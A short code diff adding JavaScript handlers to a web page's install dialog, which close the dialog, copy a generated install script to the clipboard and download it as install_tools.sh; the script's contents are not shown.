+document.getElementById('closeInstallBtn').addEventListener('click', ()=>{
+  document.getElementById('installBackdrop').classList.remove('open');
+});
+document.getElementById('copyAllInstallBtn').addEventListener('click', (e)=>{
+  navigator.clipboard.writeText(buildFullInstallScript()).then(()=>{
+    const btn = e.target;
+    const old = btn.innerText;
+    btn.innerText = 'Copied all!';
+    setTimeout(()=>{btn.innerText = old;}, 1400);
+  });
+});
+document.getElementById('downloadInstallBtn').addEventListener('click', ()=>{
+  const blob = new Blob([buildFullInstallScript()], {type:'text/plain'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'install_tools.sh';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+});
 </script>
 </body>
 </html>
